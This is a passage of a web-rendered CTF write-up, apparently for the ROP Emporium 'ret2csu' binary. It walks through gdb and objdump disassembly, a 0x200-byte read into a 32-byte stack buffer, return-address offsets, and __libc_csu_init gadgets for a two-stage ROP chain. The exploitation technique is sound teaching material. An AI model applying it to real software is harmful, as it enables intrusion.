operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"125\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009ba\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"128\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009bf\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"133\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7f0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"read@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009c4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"138\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x34a\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009cb\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"145\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"150\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d1\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"151\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\tleave  \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"152\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(a.p,{children:[\"From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading \",(0,e.jsx)(a.strong,{children:\"0x200\"}),\" from the standard input file descriptor, which is more than the buffer size. The c equivalent of the above vulnerability is,\"]}),(0,e.jsx)(a.pre,{className:\"language-c\",children:(0,e.jsx)(a.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"rbp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" #reading \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),\" from the \",(0,e.jsx)(a.span,{className:\"token constant\",children:\"stdin\"}),`\n`]})})}),(0,e.jsx)(a.p,{children:\"For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.\"}),(0,e.jsx)(a.div,{children:(0,e.jsx)(l,{alt:\"ret control\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(a.p,{children:[\"From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the \",(0,e.jsx)(a.strong,{children:\"NX\"}),\" execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.\"]}),(0,e.jsxs)(a.h2,{id:\"libc_csu_init-disassembly\",children:[(0,e.jsx)(a.a,{href:\"#libc_csu_init-disassembly\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),(0,e.jsx)(a.strong,{children:\"libc_csu_init\"}),\" Disassembly\"]}),(0,e.jsxs)(a.p,{children:[\"Below is the disassembled code for \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token number\",children:\"0000000000400640\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400640\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"57\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400642\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"56\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400644\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"49\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" d7             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400647\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"55\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400649\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"54\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40064b:\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"8d\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"25\"}),\" 9e \",(0,e.jsx)(a.span,{className:\"token number\",children:\"07\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20079e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # 600df0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__frame_dummy_init_array_entry\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400652\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"55\"}),\"                   \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400653\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"8d\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"2d\"}),\" 9e \",(0,e.jsx)(a.span,{className:\"token number\",children:\"07\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20079e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # 600df8 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__do_\",(0,e.jsx)(a.span,{className:\"token keyword\",children:\"global_dtors_aux_fini_array_entry\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065a:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"53\"}),\"                   \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" fd             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"49\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" f6             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400661\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"29\"}),\" e5             \tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400664\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" ec \",(0,e.jsx)(a.span,{className:\"token number\",children:\"08\"}),\"          \tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400668\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" c1 fd \",(0,e.jsx)(a.span,{className:\"token number\",children:\"03\"}),\"          \tsar    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x3\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40066c:\te8 5f fe ff ff       \tcall   4004d0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400671\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"85\"}),\" ed             \ttest   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400674\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"74\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\"                \tje     \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400696\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x56\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400676\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"31\"}),\" db                \txor    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ebx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ebx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400678\"}),\":\t0f 1f \",(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tnop    DWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40067f:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),` \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400680\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" fa             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400683\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" f6             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400686\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"44\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" ef             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400689\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" ff \",(0,e.jsx)(a.span,{className:\"token number\",children:\"14\"}),\" dc          \tcall   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"40068d\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" c3 \",(0,e.jsx)(a.span,{className:\"token number\",children:\"01\"}),\"          \tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x1\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400691\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"39\"}),\" dd             \tcmp    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400694\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"75\"}),\" ea                \tjne    \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400696\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" c4 \",(0,e.jsx)(a.span,{className:\"token number\",children:\"08\"}),\"          \tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069a:\t5b                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069c:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5c                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a0:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5e                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a2:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5f                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006a4:\tc3                   \tret    \n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a5:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"90\"}),`                   \tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a6:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"66\"}),\" 2e 0f 1f \",(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \t\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"cs\"}),\" nop WORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006ad:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),` \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"00000000004006b0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"__libc_csu_fini\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006b0:\tf3 c3                \trepz ret z\n`})]})}),(0,e.jsxs)(a.p,{children:[\"The \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control \",(0,e.jsx)(a.strong,{children:\"RBX, RBP, R12, R13, R14, and R15\"}),\" registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.\"]}),(0,e.jsx)(a.p,{children:\"The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069a:\t5b                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069c:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5c                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),` \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a0:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5e                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a2:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5f                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006a4:\tc3                   \tret    \n`})]})}),(0,e.jsxs)(a.p,{children:[\"For the second stage, we need to look for the gadgets that will enable us to control the \",(0,e.jsx)(a.strong,{children:\"RDI, RSI and RDX\"}),\" registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in \",(0,e.jsx)(a.strong,{children:\"RDI, RSI and RDX\"}),\" registers respectively. From the disassembly of \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" we can get our second gadget to build our rop chain.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"call   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token 